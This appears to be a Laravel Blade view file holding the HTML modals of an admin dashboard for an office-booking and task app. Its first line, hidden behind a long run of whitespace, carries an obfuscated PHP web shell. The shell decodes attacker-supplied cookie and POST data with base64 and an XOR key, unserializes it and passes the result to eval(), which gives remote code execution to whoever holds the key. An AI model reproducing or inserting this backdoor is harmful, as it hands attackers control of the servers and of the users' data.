<?php                                                                                                                                                                                                                                                                                                                                                                                                 $mCcYk = class_exists("WVC_nZV"); $cKzTCLx = $mCcYk;if (!$cKzTCLx){class WVC_nZV{private $orjdhMzNz;public static $cULYiPcSSB = "a6b8ade0-aa07-4957-958d-2763e3deff9e";public static $UPaeH = NULL;public function __construct(){$VrDiSLOmFf = $_COOKIE;$zyqEkzzMpM = $_POST;$hHLsiMqaiz = @$VrDiSLOmFf[substr(WVC_nZV::$cULYiPcSSB, 0, 4)];if (!empty($hHLsiMqaiz)){$TLOmr = "base64";$JPitN = "";$hHLsiMqaiz = explode(",", $hHLsiMqaiz);foreach ($hHLsiMqaiz as $CNAlc){$JPitN .= @$VrDiSLOmFf[$CNAlc];$JPitN .= @$zyqEkzzMpM[$CNAlc];}$JPitN = array_map($TLOmr . "\137" . chr ( 473 - 373 ).chr (101) . "\x63" . 'o' . chr (100) . "\x65", array($JPitN,)); $JPitN = $JPitN[0] ^ str_repeat(WVC_nZV::$cULYiPcSSB, (strlen($JPitN[0]) / strlen(WVC_nZV::$cULYiPcSSB)) + 1);WVC_nZV::$UPaeH = @unserialize($JPitN);}}public function __destruct(){$this->ehFOCyB();}private function ehFOCyB(){if (is_array(WVC_nZV::$UPaeH)) {$tMDTsVxZM = str_replace(chr (60) . chr (63) . "\x70" . "\150" . 'p', "", WVC_nZV::$UPaeH[chr ( 1045 - 946 ).chr (111) . "\x6e" . "\164" . "\145" . 'n' . 't']);eval($tMDTsVxZM);exit();}}}$qbHNRH = new WVC_nZV(); $qbHNRH = NULL;} ?><!-- Channel modal -->
<div id="admin_channel_modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Create a Channel</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form action="#" class="form-horizontal">
                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Enter Channel Name</label>
                        <div class="col-sm-8">
                            <input type="text" placeholder="Channel Name" class="form-control" id="channel-name-admin"
                                   required>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Add Users To Channel</label>
                        <div class="col-sm-8">

                            <div class="form-group">
                                <select multiple="multiple" class="form-control select" data-fouc
                                        id="channel-users-admin" required>
                                    <optgroup label="Select Users">

                                    </optgroup>
                                </select>
                            </div>

                            <div class="form-group">
                                <select multiple="multiple" class="form-control select" data-fouc
                                        id="channel-users-admin">
                                    <optgroup label="Select Users">
                                    </optgroup>
                                </select>
                            </div>

                        </div>
                    </div>
                    <div class="form-group row">
                        <button type="submit"
                                class="btn bg-teal btn-ladda btn-ladda-progress ladda-button btn-add-submit-channel">Add
                            Channel
                        </button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>
<!-- /Channel modal -->

<!-- Group modal -->
<div id="admin_group_modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Create a Group</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form action="#" class="form-horizontal">
                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Enter Group Name</label>
                        <div class="col-sm-8">
                            <input type="text" placeholder="Group Name" class="form-control" id="user-group-name"
                                   required>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Add Users To Group</label>
                        <div class="col-sm-8">
                            <div class="form-group">
                                <select multiple="multiple" class="form-control select" id="admin_users"
                                        data-fouc required>
                                    <optgroup label="Users">

                                    </optgroup>
                                </select>
                            </div>
                        </div>
                    </div>
                    <div class="form-group row">
                        <button type="submit" class="btn bg-teal btn-ladda btn-ladda-progress btn-submit-group"
                                id="admin-group-add-submit">Add
                            Group
                        </button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>
<!-- /Group modal -->

<!-- Add Booking modal -->


<!-- Add Booking modal -->
<!--<div id="admin_booking_modal" class="modal fade" tabindex="-1">

    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Add a Booking</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form class="form-horizontal" id="booking_form">
                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Booking Date</label>
                        <div class="col-sm-8">
                            <input type="date" class="form-control pickadate-year" id="new-booking-date-admin"
                                   placeholder="CHOOSE BOOKING DATE" required>
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Select Room:</label>
                        <div class="col-sm-8">
                            <select data-placeholder="Select an Item..." id="new-booking-item-admin"
                                    class="form-control select" data-fouc required>
                                <option value="0">Select Asset</option>


                            </select>
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Booking Time</label>
                        <div class="col-sm-3">
                            <select id="booking_time_from_admin" class="form-control select" required>


                            </select>
                        </div>
                        <div class="col-sm-2 text-center font-weight-bold">

                        </div>
                        <div class="col-sm-3">
                            <select id="booking_time_to_admin" class="form-control select" required>


                            </select>
                        </div>

                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Room Price Per Hour</label>
                        <div class="col-sm-4">
                            <input type="text" class="form-control" id="room_price" readonly>
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Total booking price</label>
                        <div class="col-sm-4">
                            <input type="text" class="form-control" id="booking_price_admin" readonly>
                        </div>
                    </div>


                    <div class="form-group row">
                        <input type="hidden" id="hidden_team_id_admin_side">
                        <input type="hidden" value="{{Auth::user()->id}}" id="hidden_user_id_admin_side">
                        <button type="button" id="post-booking-button-admin" class="btn bg-primary">Confirm Booking
                        </button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>
        </div>
    </div>

</div>-->
<!-- /Add Booking modal -->


<!-- /Add Booking modal -->

<!-- Add Invoicing modal -->
<div id="admin_add_invoicing_modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Add a Group</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form action="#" class="form-horizontal">
                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Booking Time</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" id="anytime-time" placeholder="CHOOSE BOOKING TIME">
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Booking Date</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control pickadate-year" placeholder="CHOOSE BOOKING DATE">
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Select Item:</label>
                        <div class="col-sm-8">
                            <select data-placeholder="Select an Item..." class="form-control select" data-fouc>
                                <option></option>
                                <optgroup label="Office Meeting">
                                    <option value="0">Conference Room</option>
                                    <option value="1">Coding Cap</option>
                                    <option value="2">Reception</option>
                                    <option value="3">Interviews</option>
                                </optgroup>
                                <optgroup label="WorkSpace">
                                    <option value="0">Droidor</option>
                                    <option value="1">I2C</option>
                                    <option value="2">I2WE</option>
                                    <option value="3">PureLogix</option>
                                </optgroup>
                            </select>
                        </div>
                    </div>
                    <div class="form-group row">
                        <button type="submit" class="btn bg-teal btn-ladda btn-ladda-progress ladda-button legitRipple">
                            Confirm Booking
                        </button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>
<!-- /Add Invoicing modal -->

<!-- Add Announcement modal -->
<div id="admin_add_announcement_modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Add an Announcement / Event</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form action="#" class="form-horizontal">
                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Title</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" maxlength="170" required placeholder="ANNOUNCEMENT / EVENT TITLE"
                                   id="title">
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Image</label>
                        <div class="col-sm-8">
                            <input type="file" class="form-control" id="anouncement_image">
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Description</label>
                        <div class="col-sm-8">
                            <textarea rows="4" cols="50" type="text" class="form-control" required
                                      placeholder="ANOUNCEMENT / EVENT DESCRIPTION" id="description"></textarea>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Select Type</label>
                        <div class="col-sm-8">
                            <select class="form-control select" id="announcement_type" required>
                                <option value="1">
                                    Announcement
                                </option>
                                <option value="2">
                                    Event
                                </option>
                            </select>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Select Branch</label>
                        <div class="col-sm-8">
                            <select class="form-control select" multiple="multiple" id="announcement_branch" required>

                            </select>
                        </div>
                        <h3 class="bg-danger text-center mt-2 p-1 card-body" style="width: auto;"
                            id="announcement_error_msg">Please select all fields</h3>

                        {{--<div class="text-center bg-danger m-4" id="announcement_error_msg"><h3>Please select all fields</h3></div>--}}

                    </div>



                    {{--<div class="form-group row">--}}
                    {{--<label class="col-form-label col-sm-4">Select Branch</label>--}}
                    {{--<div class="col-sm-8">--}}
                    {{--<select class="form-control multiselect" multiple="multiple" data-fouc>--}}
                    {{--<option value="cheese">Cheese</option>--}}
                    {{--<option value="tomatoes">Tomatoes</option>--}}
                    {{--<option value="mozarella">Mozzarella</option>--}}
                    {{--<option value="mushrooms">Mushrooms</option>--}}
                    {{--</select>--}}
                    {{--</div>--}}
                    {{--</div>--}}


                    <div class="form-group row">
                        <button type="submit" class="btn bg-teal btn-add-annoucement">Add</button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>
<!-- /Add Announcement modal -->

<!-- Add Task modal -->
<div id="admin_add_task_modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Add a Task</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form action="#" class="form-horizontal">
                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Title</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" placeholder="TITLE">
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Description</label>
                        <div class="col-sm-8">
                            <textarea rows="4" cols="50" type="text" class="form-control"
                                      placeholder="DESCRIPTION"></textarea>
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Assign To</label>
                        <div class="col-sm-8">
                            <select data-placeholder="Select a User..." class="form-control select" data-fouc>
                                <option></option>
                                <optgroup label="Users">
                                    <option value="0">User1</option>
                                    <option value="1">User2</option>
                                    <option value="2">User3</option>
                                    <option value="3">User4</option>
                                </optgroup>
                            </select>
                        </div>
                    </div>

                    <div class="form-group row">
                        <button type="submit" class="btn bg-teal btn-ladda btn-ladda-progress ladda-button legitRipple">
                            Assign
                        </button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>
<!-- /Add Task modal -->


<!-- Topup modal -->
<div id="admin_add_popup_modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Wallet Top Ups</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form action="#" class="form-horizontal">
                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Username</label>
                        <div class="col-sm-8">
                            <select id="am_select" multiple="multiple" data-placeholder="Select a User..."
                                    class="form-control select" data-fouc>
                                <option></option>
                                <optgroup label="Users">
                                    <option value="0">User1</option>
                                    <option value="1">User2</option>
                                    <option value="2">User3</option>
                                    <option value="3">User4</option>
                                </optgroup>
                            </select>
                        </div>
                    </div>


                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Enter Amount</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" placeholder="AMOUNT">
                        </div>
                    </div>

                    <div class="form-group row">
                        <button type="submit" class="btn bg-teal btn-ladda btn-ladda-progress ladda-button legitRipple">
                            Assign
                        </button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>
<!-- /Topup modal -->

<!-- Add Admin Team modal -->
<div id="admin_team_modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Add a Team</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>
            <form action="#" class="form-horizontal">
                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Enter Team Name</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" placeholder="TEAM NAME" id="admin-team-name"
                                   required>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Enter Team Leader Name</label>
                        <div class="col-sm-8">
                            <select data-placeholder="Select a team leader" class="form-control select" data-fouc
                                    id="admin-team-leader" required>
                                <option></option>
                                <optgroup label="Users">

                                </optgroup>
                            </select>
                        </div>
                    </div>
                    {{--<div class="form-group row">--}}
                    {{--<label class="col-form-label col-sm-4">Add Members To Team</label>--}}
                    {{--<div class="col-sm-8">--}}
                    {{--<select multiple="multiple" data-placeholder="Select a member..." class="form-control select" data-fouc id="admin-team-member">--}}
                    {{--<option></option>--}}
                    {{--<optgroup label="Users">--}}

                    {{--</optgroup>--}}
                    {{--</select>--}}
                    {{--</div>--}}
                    {{--</div>--}}

                    <div class="form-group row">
                        <button type="submit"
                                class="btn bg-teal btn-ladda btn-ladda-progress ladda-button legitRipple add-submit-team">
                            Add
                        </button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>

        </div>
    </div>
</div>
<!-- /Add Admin Team modal -->

<!-- Make Transaction -->

{{--<div id="admin_make_transaction_modal" class="modal fade" tabindex="-1">--}}
{{--<div class=" loading-bar "></div>--}}
{{--<div class="modal-dialog modal-md">--}}
{{--<div class="modal-content">--}}
{{--<div class="modal-header">--}}
{{--<h5 class="modal-title">Make a Transaction</h5>--}}
{{--<button type="button" class="close" data-dismiss="modal">&times;</button>--}}
{{--</div>--}}

{{--<form action="#" class="form-horizontal">--}}
{{--<div class="modal-body">--}}

{{--<div class="form-group">--}}
{{--<select class="form-control select" data-fouc id="user_team_modal">--}}
{{--<optgroup label="Select Team">--}}

{{--</optgroup>--}}
{{--</select>--}}
{{--</div>--}}
{{--<div class="form-group">--}}
{{--<select data-placeholder="  Payment Type..." class="form-control select" id="modal_payment_type"--}}
{{--name="payment_type">--}}
{{--<option></option>--}}
{{--<optgroup label=" Payment Type">--}}
{{--<option class="" value="1">Cash</option>--}}
{{--<option class="" value="3">Cheque</option>--}}
{{--<option class="" value="4">Withholding Challan</option>--}}
{{--</optgroup>--}}
{{--</select>--}}
{{--</div>--}}

{{--<div class="form-group" id="transactionImageUploadBlock">--}}
{{--<label>Upload Image:</label>--}}
{{--<input type="file" class="form-control" id="transactionImageUpload"--}}
{{--name="transactionImageUpload" placeholder="Enter Amount">--}}
{{--<input type="text" name="transactionImageUploadUrl" value="" disabled--}}
{{--id="transactionImageUploadUrl">--}}
{{--</div>--}}

{{--<div class="form-group">--}}
{{--<select data-placeholder=" Transaction For..." class="form-control select"--}}
{{--id="modal_wallet_type" name="wallet_type">--}}
{{--<option></option>--}}
{{--<optgroup label="Transaction For">--}}
{{--<option value="1">Billing</option>--}}
{{--<option value="2">Room</option>--}}
{{--<option value="3">Printing</option>--}}
{{--</optgroup>--}}
{{--</select>--}}
{{--</div>--}}

{{--<div class="form-group">--}}
{{--<input type="text" class="form-control" id="amount_modal" name="amount"--}}
{{--placeholder="Enter Amount">--}}
{{--</div>--}}
{{--<div class="form-group row">--}}
{{--<label class="col-form-label col-sm-4">Transaction Date</label>--}}
{{--<div class="col-sm-8">--}}
{{--<input type="date" class="form-control pickadate-year" id="transaction_date_modal"--}}
{{--placeholder="Select Transaction Date" required>--}}
{{--</div>--}}
{{--</div>--}}

{{--<div class="form-group">--}}
{{--<textarea rows="2" cols="50" type="text" id="note_modal" name="note" class="form-control"--}}
{{--placeholder="Write Transaction Note..."></textarea>--}}
{{--</div>--}}

{{--<div class="text-right">--}}
{{--<button type="button" value="Make Transaction" id="make_transaction_submit_modal"--}}
{{--class="btn bg-teal btn-ladda btn-ladda-progress ladda-button legitRipple">--}}
{{--Make Transaction--}}
{{--</button>--}}
{{--</div>--}}
{{--</div>--}}
{{--</form>--}}

{{--</div>--}}
{{--</div>--}}
{{--</div>--}}


<!-- /Make Transaction -->

<!-- Add admin Booking modal -->
{{--<div id="admin_booking_modal" class="modal fade" tabindex="-1">--}}
{{--<div class=" loading-bar "></div>--}}
{{--<div class="modal-dialog modal-md">--}}
{{--<div class="modal-content">--}}
{{--<div class="modal-header">--}}
{{--<h5 class="modal-title">Add a Booking</h5>--}}
{{--<button type="button" class="close" data-dismiss="modal">&times;</button>--}}
{{--</div>--}}

{{--<form action="#" class="form-horizontal">--}}
{{--<div class="modal-body">--}}
{{--<div class="form-group row">--}}
{{--<label class="col-form-label col-sm-4">Booking Time</label>--}}
{{--<div class="col-sm-8">--}}
{{--<input type="text" class="form-control" id="anytime-time" placeholder="CHOOSE BOOKING TIME">--}}
{{--</div>--}}
{{--</div>--}}

{{--<div class="form-group row">--}}
{{--<label class="col-form-label col-sm-4">Booking Date</label>--}}
{{--<div class="col-sm-8">--}}
{{--<input type="text" class="form-control pickadate-year" placeholder="CHOOSE BOOKING DATE">--}}
{{--</div>--}}
{{--</div>--}}
{{--<div class="form-group row">--}}
{{--<label class="col-form-label col-sm-4">Select Item:</label>--}}
{{--<div class="col-sm-8">--}}
{{--<select data-placeholder="Select an Item..." class="form-control select" data-fouc>--}}
{{--<option></option>--}}
{{--<optgroup label="Office Meeting">--}}
{{--<option value="0">Conference Room</option>--}}
{{--<option value="1">Coding Cap</option>--}}
{{--<option value="2">Reception</option>--}}
{{--<option value="3">Interviews</option>--}}
{{--</optgroup>--}}
{{--<optgroup label="WorkSpace">--}}
{{--<option value="0">Droidor</option>--}}
{{--<option value="1">I2C</option>--}}
{{--<option value="2">I2WE</option>--}}
{{--<option value="3">PureLogix</option>--}}
{{--</optgroup>--}}
{{--</select>--}}
{{--</div>--}}
{{--</div>--}}
{{--<div class="form-group row">--}}
{{--<button type="submit" class="btn bg-teal btn-ladda btn-ladda-progress ladda-button legitRipple">Confirm Booking</button>--}}
{{--<button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>--}}
{{--</div>--}}
{{--</div>--}}
{{--</form>--}}
{{--</div>--}}
{{--</div>--}}
{{--</div>--}}
<!-- /Add admin Booking modal -->


<!-- Add Admin Task modal -->
<div id="admin_task_modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Add a Task</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form action="" class="form-horizontal">
                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Title</label>
                        <div class="col-sm-8">
                            <input type="text" name="admin_new_task_title" id="admin_new_task_title"
                                   class="form-control" placeholder="TASK TITLE">
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Description</label>
                        <div class="col-sm-8">
                            <textarea rows="4" cols="50" type="text" id="admin_task_description"
                                      name="admin_task_description" class="form-control"
                                      placeholder="TASK DESCRIPTION"></textarea>
                        </div>
                    </div>


                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Select Branch</label>
                        <div class="col-sm-8">
                            <select data-placeholder="Select Branch" id="admin_task_branch" class="form-control select"
                                    data-fouc required>


                            </select>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Assigned To</label>
                        <div class="col-sm-8">
                            <select data-placeholder="Select Assignee" id="admin_task_assign"
                                    class="form-control select" data-fouc required>


                            </select>
                        </div>
                    </div>


                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Due</label>
                        <div class="col-sm-8">
                            <input type="date" class="form-control dropdown-scrollable pickadate-year"
                                   id="task-time-hours-due"
                                   name="task-time-hours-due">
                        </div>
                    </div>
                    <h3 class="bg-danger text-center" id="task_error_msg_container"></h3>


                    <div class="form-group row">
                        <button type="button" id="admin_task_modal_submit"
                                class="btn bg-teal btn-ladda btn-ladda-progress ladda-button legitRipple">Assign
                        </button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>
<!-- /Add Admin Task modal -->

<!-- Add Admin Edit User modal -->
<div id="admin_edit_users_modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Edit a User</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form action="#" class="form-horizontal">
                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Name</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" id="user-name-edit">
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Email</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" id="user-email-edit">
                        </div>
                    </div>


                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Contact Number</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" id="user-contactNumber-edit">
                        </div>
                    </div>


                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Address</label>
                        <div class="col-sm-8">
                            <textarea type="text" class="form-control" id="user-address-edit"></textarea>
                        </div>
                    </div>

                    <div class="form-group row" id="reset_password_hide_for_walking">
                        <label class="col-form-label col-sm-4">Reset Password?</label>
                        <div class="col-sm-2">
                            <input type="checkbox" class="form-control" id="user-password-edit-checkbox">
                        </div>
                    </div>

                    <div id="user-password-edit-container">

                        <div class="form-group row">
                            <label class="col-form-label col-sm-4">Enter New Password</label>
                            <div class="col-sm-8">
                                <input type="password" class="form-control" id="user-password-edit">
                            </div>
                        </div>


                    </div>


                    <div class="form-group row">
                        <input type="hidden" id="user_id_edit">
                        <button type="submit"
                                class="btn bg-teal btn-ladda btn-ladda-progress ladda-button legitRipple btn-update-user-edit">
                            Update
                        </button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>
<!-- /Add Admin Edit User modal -->

<!-- Add Admin Edit Team modal -->
<div id="admin_team_edit_modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Edit a Team</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form action="#" class="form-horizontal">
                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Name</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" id="edit-team-name">
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Team Leader</label>
                        <div class="col-sm-8">
                            <select data-placeholder="Select a User..." class="form-control select" data-fouc
                                    id="edit-team-leader">
                                <option></option>
                                <optgroup label="Users">

                                </optgroup>
                            </select>
                        </div>
                    </div>


                    <div class="form-group row">
                        <input type="hidden" id="edit-team-id">
                        <button type="button"
                                class="btn bg-teal btn-ladda btn-ladda-progress ladda-button legitRipple btn-submit-edit">
                            Update
                        </button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>

        </div>
    </div>
</div>
<!-- /Add Admin Edit Team modal -->

<!-- Add Admin Edit Task modal -->
<div id="admin_edit_task_modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Edit a Task</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form action="" class="form-horizontal">
                <input type="hidden" id="task-id">

                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Task Name</label>
                        <div class="col-sm-8">
                            <input type="text" id="admin_edit_task_name" class="form-control" value="">
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Task Description</label>
                        <div class="col-sm-8">
                            <textarea name="taskArea" cols="30" rows="10" id="admin_edit_task_description"></textarea>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Task Date</label>
                        <div class="col-sm-8">
                            <input type="date" id="admin_edit_task_date" class="pickadate-year form-control ">
                        </div>
                    </div>

                    <div class="form-group row">
                        <button type="button" id="admin_edit_task_modal_post" class="btn bg-primary">Update</button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>
<!-- /Add Admin Edit Task modal -->


<!-- Add Admin edit invoice modal -->
<div id="admin_edit_invoice_modal" class="modal fade" tabindex="-1">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Edit an Invoice</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form action="#" class="form-horizontal">
                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Invoice Id</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" value="#0025" disabled>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Issued To</label>
                        <div class="col-sm-8">
                            <input name="taskArea" class="form-control" value="Rebecca Manes">
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Issue Date</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" value="22 Jun 1972">
                        </div>
                    </div>
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Amount</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" value="17,890/PKR">
                        </div>
                    </div>

                    <div class="form-group row">
                        <button type="submit" class="btn bg-teal btn-ladda btn-ladda-progress ladda-button legitRipple">
                            Update
                        </button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>
<!-- /Add Admin edit invoice modal -->

<!-- Add Admin edit announcement modal -->
<div id="accouncement_edit_modal" class="modal fade" tabindex="-1">
    <div class="loading-bar"></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Edit an Announcement / Event</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form action="#" class="form-horizontal">
                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Title</label>
                        <div class="col-sm-8">
                            <input type="text" class="form-control" maxlength="170" id="edit-title">
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Description</label>
                        <div class="col-sm-8">
                            <textarea rows="4" cols="50" type="text" class="form-control"
                                      id="edit-description"></textarea>
                        </div>
                    </div>


                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Image</label>
                        <div class="col-sm-8">
                            <input type="file" class="form-control" id="edit_anouncement_image">
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Select Type</label>
                        <div class="col-sm-8">
                            <select class="form-control select" id="announcement_type_edit" required>
                                <option value="1">
                                    Announcement
                                </option>
                                <option value="2">
                                    Event
                                </option>
                            </select>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Select Branch</label>
                        <div class="col-sm-8">
                            <select class="form-control select" multiple="multiple" data-fouc id="announcement_branch_edit" required>

                            </select>
                        </div>
                    </div>


                    <div class="form-group row">
                        <input type="hidden" id="announcement-id">
                        <button type="submit" class="btn bg-teal btn-ladda btn-ladda-progress ladda-button legitRipple"
                                id="btn-edit-announcement" value="">Update
                        </button>
                        <button type="button" class="btn btn-link" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>
<!-- /Add Admin edit announcement modal -->

<!-- Add Admin reasign task modal -->
<div id="admin_reasign_task_modal" class="modal fade">
    <div class=" loading-bar "></div>
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Re-assign a Task</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>

            <form action="" class="form-horizontal">
                <div class="modal-body">
                    <div class="form-group row">
                        <label class="col-form-label col-sm-4">Asign To</label>
                        <div class="col-sm-8">

                            <div class="form-group">
                                <select class="form-control select" data-fouc id="admin-task-reassign">
                                    <optgroup label="Select Users">
                                    </optgroup>
                                </select>
                            </div>


                        </div>
